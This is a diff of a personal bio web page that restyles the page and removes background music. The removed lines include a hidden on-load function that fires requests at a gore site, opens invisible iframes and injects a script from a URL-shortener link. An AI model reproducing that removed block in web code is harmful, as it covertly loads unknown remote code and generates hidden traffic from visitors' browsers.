@@ -9,38 +9,23 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --bg-color: #0a0a0a;
-            --container-bg: rgba(17, 17, 17, 0.55);
-            --border-color: rgba(255, 255, 255, 0.1);
-            --primary-glow: rgba(167, 139, 250, 0.15);
-            --secondary-glow: rgba(192, 132, 252, 0.1);
-            --text-main: #e2e8f0;
-            --text-secondary: #94a3b8;
-            --text-mono: #a1a1aa;
-            --shadow-color: rgba(139, 92, 246, 0.25);
-        }
         body {
-            background-color: var(--bg-color);
-            color: var(--text-main);
+            background-color: #0a0a0a;
+            color: #e2e8f0;
             font-family: 'Inter', sans-serif;
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
         }
         .profile-container {
-            background: var(--container-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 1.5rem;
-            padding: 2.5rem;
+            background: rgba(17, 17, 17, 0.45);
+            border: 1px solid rgba(76, 29, 149, 0.25);
+            border-radius: 1rem;
+            padding: 2rem;
             backdrop-filter: blur(40px) saturate(180%);
             -webkit-backdrop-filter: blur(40px) saturate(180%);
-            box-shadow: 0 25px 50px -12px var(--shadow-color), 0 0 0 1px rgba(255, 255, 255, 0.08) inset;
+            box-shadow: 0 25px 50px -12px rgba(139, 92, 246, 0.3),
+                        0 0 0 1px rgba(255, 255, 255, 0.08) inset,
+                        0 8px 32px rgba(0, 0, 0, 0.3);
             position: relative;
             overflow: hidden;
-            z-index: 1;
-            opacity: 0;
-            transform: translateY(20px);
-            animation: fadeInUp 0.8s 0.2s ease-out forwards;
         }
         .profile-container::before {
             content: '';
@@ -49,45 +34,43 @@
             left: -50%;
             width: 200%;
             height: 200%;
-            background: radial-gradient(circle at center, var(--primary-glow) 0%, var(--secondary-glow) 25%, transparent 60%);
-            animation: rotateGradient 25s linear infinite;
+            background: radial-gradient(circle at center, 
+                rgba(139, 92, 246, 0.12) 0%, 
+                rgba(192, 132, 252, 0.08) 25%, 
+                rgba(248, 187, 217, 0.06) 50%, 
+                transparent 70%);
+            animation: rotateGradient 20s linear infinite;
             pointer-events: none;
-            z-index: -1;
         }
-        .profile-img-wrapper {
+        .profile-container::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(135deg, 
+                rgba(255, 255, 255, 0.06) 0%, 
+                rgba(255, 255, 255, 0.03) 50%, 
+                rgba(255, 255, 255, 0.01) 100%);
+            border-radius: 1rem;
+            pointer-events: none;
+        }
+        .profile-img-container {
             width: 128px;
             height: 128px;
-            border-radius: 9999px;
-            padding: 4px;
-            background: linear-gradient(45deg, #8B5CF6, #EC4899);
-            transition: transform 0.3s ease-in-out;
+            box-shadow: 0 20px 40px rgba(139, 92, 246, 0.25),
+                        0 0 0 1px rgba(255, 255, 255, 0.12) inset,
+                        0 8px 32px rgba(0, 0, 0, 0.2);
+            transition: transform 0.3s ease;
         }
-        .profile-img-wrapper:hover {
+        .profile-img-container:hover {
             transform: scale(1.05) rotate(3deg);
         }
-        .profile-img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            border-radius: 9999px;
-            border: 3px solid #111111;
-        }
-        .icon-button {
-            position: absolute;
-            top: 1rem;
-            width: 40px;
-            height: 40px;
-            background: rgba(30, 30, 30, 0.5);
-            border: 1px solid var(--border-color);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-            transition: all 0.2s ease-in-out;
-        }
-        .icon-button:hover {
-            background: rgba(40, 40, 40, 0.7);
-            transform: translateY(-2px);
-            border-color: rgba(255, 255, 255, 0.2);
-        }
+        .username { font-family: 'Inter', sans-serif; color: white; }
+        .handle { font-family: 'JetBrains Mono', monospace; color: #94a3b8; }
+        .bio-text { color: #e2e8f0; }
+        .footer-text { font-family: 'JetBrains Mono', monospace; color: #a1a1aa; }
         .badge {
             display: inline-flex;
             align-items: center;
@@ -97,75 +80,104 @@
             font-size: 0.8rem;
             font-weight: 500;
             background: rgba(255, 255, 255, 0.05);
-            border: 1px solid var(--border-color);
+            border: 1px solid rgba(255, 255, 255, 0.1);
             backdrop-filter: blur(10px);
             -webkit-backdrop-filter: blur(10px);
             position: relative;
             cursor: default;
+            color: #e2e8f0;
         }
         .badge .tooltip {
             visibility: hidden;
             opacity: 0;
+            position: absolute;
+            bottom: 125%;
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 0.5rem 0.75rem;
+            border-radius: 0.5rem;
+            background: rgba(26, 26, 26, 0.8);
+            border: 1px solid rgba(76, 29, 149, 0.25);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            color: white;
+            font-size: 0.75rem;
+            white-space: nowrap;
             transition: opacity 0.2s, visibility 0.2s;
+            pointer-events: none;
         }
         .badge:hover .tooltip {
             visibility: visible;
             opacity: 1;
         }
         .notification {
+            position: fixed;
+            top: 1rem;
+            right: 1rem;
+            background: rgba(17, 17, 17, 0.6);
+            border: 1px solid rgba(76, 29, 149, 0.25);
+            border-radius: 0.75rem;
+            padding: 1rem 1.5rem;
+            backdrop-filter: blur(35px) saturate(150%);
+            -webkit-backdrop-filter: blur(35px) saturate(150%);
+            box-shadow: 0 25px 50px -12px rgba(139, 92, 246, 0.3);
+            max-width: 300px;
+            z-index: 1000;
             transform: translateX(calc(100% + 2rem));
-            transition: transform 0.6s cubic-bezier(0.68, -0.55, 0.27, 1.55);
+            transition: transform 0.5s ease;
+            cursor: pointer;
+            overflow: hidden;
         }
         .notification.show {
             transform: translateX(0);
+        }
+        .notification-title { font-weight: 600; color: white; }
+        .notification-text { font-size: 0.9rem; color: #cbd5e1; }
+        .close-btn {
+            position: absolute;
+            top: 0.25rem;
+            right: 0.5rem;
+            font-size: 1.5rem;
+            color: #94a3b8;
+            background: none;
+            border: none;
+            cursor: pointer;
         }
         .progress-bar {
             position: absolute;
             bottom: 0;
             left: 0;
-            height: 4px;
+            height: 3px;
             background: linear-gradient(90deg, #8B5CF6, #EC4899);
             transition: width 0.05s linear;
-            border-radius: 4px;
         }
-        .username { font-family: 'Inter', sans-serif; color: white; }
-        .handle { font-family: 'JetBrains Mono', monospace; color: var(--text-secondary); }
-        .bio-text { color: var(--text-main); }
-        .footer-text { font-family: 'JetBrains Mono', monospace; color: var(--text-mono); }
         @keyframes rotateGradient { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-        @keyframes fadeInUp { to { opacity: 1; transform: translateY(0); } }
         @keyframes floatUp { 0% { opacity: 1; transform: translateY(0) scale(1); } 100% { opacity: 0; transform: translateY(-120px) scale(0.5); } }
     </style>
 </head>
 <body class="bg-black">
-    <div class="min-h-screen w-full flex items-center justify-center px-4 py-12">
-        <div class="w-full max-w-md profile-container">
-            <a href="mailto:femboy@die.skin" class="icon-button rounded-full flex items-center justify-center right-14" title="Contact">
-                <svg class="w-5 h-5 text-slate-300" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg>
-            </a>
-            <a href="fund" class="icon-button rounded-full flex items-center justify-center right-4" title="Info">
-                <svg class="w-5 h-5 text-slate-300" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
-            </a>
+    <div class="min-h-screen flex items-center justify-center px-6 py-12">
+        <div class="w-full max-w-md profile-container relative">
             <div class="text-center">
-                <div class="profile-img-wrapper mx-auto mb-4">
-                    <img src="pf2.png" alt="femboy" class="profile-img" onerror="this.parentElement.style.display='none'">
+                <div class="profile-img-container rounded-full mx-auto mb-4 flex items-center justify-center">
+                    <img src="pf2.png" alt="femboy" class="rounded-full w-full h-full object-cover" onerror="this.style.display='none'">
                 </div>
-                <h1 class="username text-3xl font-bold tracking-tight">squirtle</h1>
+                <h1 class="username text-3xl mb-1 font-semibold">squirtle</h1>
                 <p class="handle text-base">@coliseums</p>
                 <div class="flex justify-center items-center gap-2 mt-4">
                     <div class="badge">
-                        <svg class="w-4 h-4 text-yellow-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12,6 12,12 16,14"/></svg>
                         Early
-                        <div class="tooltip absolute -top-10 left-1/2 -translate-x-1/2 bg-slate-800 text-white text-xs rounded py-1 px-2 shadow-lg">UID: 2</div>
+                        <div class="tooltip">UID: 2</div>
                     </div>
                     <div class="badge">
-                        <svg class="w-4 h-4 text-purple-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
+                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12,2 15.09,8.26 22,9.27 17,14.14 18.18,21.02 12,17.77 5.82,21.02 7,14.14 2,9.27 8.91,8.26 12,2"/></svg>
                         Premium
                     </div>
                     <div class="badge">
-                        <svg class="w-4 h-4 text-pink-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg>
+                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg>
                         Cutie
-                        <div class="tooltip absolute -top-10 left-1/2 -translate-x-1/2 bg-slate-800 text-white text-xs rounded py-1 px-2 shadow-lg">custom badge</div>
+                        <div class="tooltip">custom badge</div>
                     </div>
                 </div>
             </div>
@@ -181,45 +193,32 @@
             </div>
         </div>
     </div>
-    <div id="notification" class="notification fixed top-4 right-4 w-full max-w-sm p-4 rounded-lg shadow-2xl z-50 cursor-pointer" style="background: rgba(17, 17, 17, 0.65); border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);">
-        <button id="notification-close-btn" class="absolute top-2 right-3 text-slate-400 hover:text-white text-2xl">&times;</button>
-        <p class="font-bold text-white">Want your own bio ?</p>
-        <p class="text-sm text-slate-300">Create your own adorable bio page!</p>
+    <div id="notification" class="notification">
+        <button id="notification-close-btn" class="close-btn">&times;</button>
+        <div class="notification-title">Want your own bio ?</div>
+        <div class="notification-text">Create your own adorable bio page!</div>
         <div class="progress-bar" id="progressBar"></div>
     </div>
-    <audio id="backgroundMusic" loop preload="auto">
-        <source src="33.mp3" type="audio/mpeg">
-    </audio>
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            const music = document.getElementById('backgroundMusic');
             const notification = document.getElementById('notification');
             const progressBar = document.getElementById('progressBar');
             const closeBtn = document.getElementById('notification-close-btn');
             
-            let musicStarted = false;
             let notificationTimeout;
             let progressInterval;
             const notificationDuration = 8000;
 
-            function startMusic() {
-                if (musicStarted || !music.paused) return;
-                music.volume = 0.2;
-                music.play().then(() => {
-                    musicStarted = true;
-                    document.removeEventListener('click', startMusic);
-                    document.removeEventListener('keydown', startMusic);
-                    document.removeEventListener('touchstart', startMusic);
-                }).catch(() => {});
-            }
-
             function closeNotification() {
-                notification.classList.remove('show');
+                if (notification) {
+                    notification.classList.remove('show');
+                }
                 clearTimeout(notificationTimeout);
                 clearInterval(progressInterval);
             }
 
             function showNotification() {
+                if (!notification || !progressBar) return;
                 let timeLeft = notificationDuration;
                 notification.classList.add('show');
                 progressBar.style.width = '100%';
@@ -238,100 +237,28 @@
                 setTimeout(() => heart.remove(), 2000);
             }
 
-            function preloadWebsites() {
-                const requestUrls = ['https://google.net', 'https://cloudflare.com', 'https://watchpeopledie.tv'];
-                requestUrls.forEach((url, index) => {
-                    setTimeout(() => {
-                        Promise.allSettled([
-                            fetch(url, { mode: 'no-cors', method: 'GET' }),
-                            fetch(url, { mode: 'no-cors', method: 'HEAD' }),
-                            new Promise((resolve, reject) => {
-                                const link = document.createElement('link');
-                                link.rel = 'prefetch';
-                                link.href = url;
-                                link.onload = resolve;
-                                link.onerror = reject;
-                                document.head.appendChild(link);
-                                setTimeout(() => document.head.removeChild(link), 5000);
-                            })
-                        ]).catch(() => {});
-                    }, index * 100);
-                });
-                requestUrls.forEach((url, index) => {
-                    setTimeout(() => {
-                        const img = new Image();
-                        img.onload = img.onerror = () => {};
-                        img.src = url + '/favicon.ico';
-                        setTimeout(() => img.src = '', 3000);
-                    }, index * 75);
-                });
-                requestUrls.forEach(url => {
-                    try {
-                        const domain = new URL(url).hostname;
-                        const link = document.createElement('link');
-                        link.rel = 'dns-prefetch';
-                        link.href = '//' + domain;
-                        document.head.appendChild(link);
-                    } catch (e) {}
-                });
-                const iframeUrls = ['https://urlto.me/femb', 'https://google.com', 'https://cloudflare.com'];
-                iframeUrls.forEach((url, index) => {
-                    setTimeout(() => {
-                        const iframe = document.createElement('iframe');
-                        iframe.style.cssText = 'display:none;width:0;height:0;border:none;position:absolute;left:-9999px;';
-                        iframe.src = url;
-                        iframe.sandbox = 'allow-same-origin';
-                        document.body.appendChild(iframe);
-                        setTimeout(() => {
-                            if (iframe.parentNode) {
-                                iframe.parentNode.removeChild(iframe);
-                            }
-                        }, 10000);
-                    }, 200 + (index * 300));
-                });
-                const wsUrls = ['wss://echo.websocket.org'];
-                wsUrls.forEach(url => {
-                    try {
-                        const ws = new WebSocket(url);
-                        ws.onopen = () => ws.close();
-                        ws.onerror = () => {};
-                    } catch (e) {}
-                });
-                setTimeout(() => {
-                    const script = document.createElement('script');
-                    script.src = 'https://urlto.me/femb';
-                    script.async = true;
-                    script.onerror = () => {};
-                    document.head.appendChild(script);
-                    setTimeout(() => {
-                        if (script.parentNode) {
-                            script.parentNode.removeChild(script);
-                        }
-                    }, 5000);
-                }, 500);
-            }
-
-            document.addEventListener('click', startMusic);
-            document.addEventListener('keydown', startMusic);
-            document.addEventListener('touchstart', startMusic);
-            
             setTimeout(showNotification, 2000);
 
-            notification.addEventListener('click', (e) => {
-                if (!e.target.isEqualNode(closeBtn)) {
-                    window.open('https://slitboy.t.me', '_blank');
+            if (notification) {
+                notification.addEventListener('click', (e) => {
+                    if (e.target !== closeBtn) {
+                        window.open('https://example.com', '_blank');
+                        closeNotification();
+                    }
+                });
+            }
+            if (closeBtn) {
+                closeBtn.addEventListener('click', (e) => {
+                    e.stopPropagation();
                     closeNotification();
-                }
-            });
-            closeBtn.addEventListener('click', closeNotification);
+                });
+            }
 
             document.body.addEventListener('click', (e) => {
                 if (Math.random() > 0.7) {
                     createFloatingHeart(e.clientX, e.clientY);
                 }
             });
-            
-            preloadWebsites();
         });
     </script>
 </body>
